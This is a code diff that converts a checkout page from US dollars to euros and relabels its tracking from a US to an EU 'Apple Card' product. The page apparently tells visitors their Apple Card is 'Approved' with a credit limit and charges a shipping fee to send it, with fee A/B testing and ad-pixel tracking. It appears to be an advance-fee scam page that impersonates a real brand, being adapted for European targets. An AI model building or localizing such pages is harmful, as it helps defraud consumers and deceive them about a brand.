@@ -120,7 +120,7 @@
                 </div>
                 <div class="card-mini-info">
                     <div class="cmi-name" id="cardHolderName">Guest</div>
-                    <div class="cmi-limit">Limit: <span id="cardLimit">$5,000.00</span></div>
+                    <div class="cmi-limit">Limit: <span id="cardLimit">€ 5.000,00</span></div>
                 </div>
                 <div class="card-mini-badge">Approved</div>
             </div>
@@ -145,7 +145,7 @@
                             <div class="ship-name">Standard Shipping</div>
                             <div class="ship-time">Delivery in 7-10 business days</div>
                         </div>
-                        <div class="ship-price" id="priceEconomico">$17.45</div>
+                        <div class="ship-price" id="priceEconomico">€ 17.45</div>
                     </div>
                     <div class="ship-features">
                         <div class="ship-feature"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Tracking</div>
@@ -161,7 +161,7 @@
                             <div class="ship-name">Express Shipping</div>
                             <div class="ship-time">Delivery in 4-5 business days</div>
                         </div>
-                        <div class="ship-price" id="priceExpresso">$22.45</div>
+                        <div class="ship-price" id="priceExpresso">€ 22.45</div>
                     </div>
                     <div class="ship-features">
                         <div class="ship-feature"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Tracking</div>
@@ -178,7 +178,7 @@
                             <div class="ship-name">Premium Shipping</div>
                             <div class="ship-time">Delivery in 1-2 business days</div>
                         </div>
-                        <div class="ship-price" id="pricePremium">$27.97</div>
+                        <div class="ship-price" id="pricePremium">€ 27.97</div>
                     </div>
                     <div class="ship-features">
                         <div class="ship-feature"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Tracking</div>
@@ -202,10 +202,10 @@
             <!-- Price summary -->
             <div class="price-summary">
                 <span class="ps-label">Shipping cost</span>
-                <span class="ps-value" id="priceDisplay">$22.45</span>
+                <span class="ps-value" id="priceDisplay">€ 22.45</span>
             </div>
 
-            <button class="submit-btn" id="submitBtn" onclick="proceedToCheckout()">Complete shipping — <span id="btnPrice">$22.45</span></button>
+            <button class="submit-btn" id="submitBtn" onclick="proceedToCheckout()">Complete shipping — <span id="btnPrice">€ 22.45</span></button>
 
             <div class="secure-badges">
                 <div class="sb"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Secure payment</div>
@@ -252,7 +252,7 @@
             window._tracker.trackEvent('abtest', JSON.stringify({ test: 'frete_precos', group: abGroup }));
         }
 
-        const fmt = (v) => `$${v.toFixed(2)}`;
+        const fmt = (v) => `€ ${v.toFixed(2)}`;
 
         const elEconomico = document.getElementById('shipEconomico');
         const elExpresso = document.getElementById('shipExpresso');
@@ -289,7 +289,7 @@
 
         document.getElementById('miniCardBg').style.background = colorMap[data.cartao_cor||'silver'] || colorMap.silver;
         document.getElementById('cardHolderName').textContent = data.nome || 'Guest';
-        document.getElementById('cardLimit').textContent = `$${(data.limite_aprovado||5000).toLocaleString('en-US')}.00`;
+        document.getElementById('cardLimit').textContent = `€ ${(data.limite_aprovado||5000).toLocaleString('de-DE')},00`;
 
         // Address
         if(data.rua){
@@ -320,8 +320,8 @@
             document.getElementById('btnPrice').textContent = fmt(selectedPrice);
             if (window.track) window.track('AddToCart', {
                 value: selectedPrice,
-                currency: 'USD',
-                content_id: 'apple-card-us-' + selectedType,
+                currency: 'EUR',
+                content_id: 'apple-card-eu-' + selectedType,
                 content_name: 'Apple Card — ' + selectedType,
                 content_type: 'product'
             });
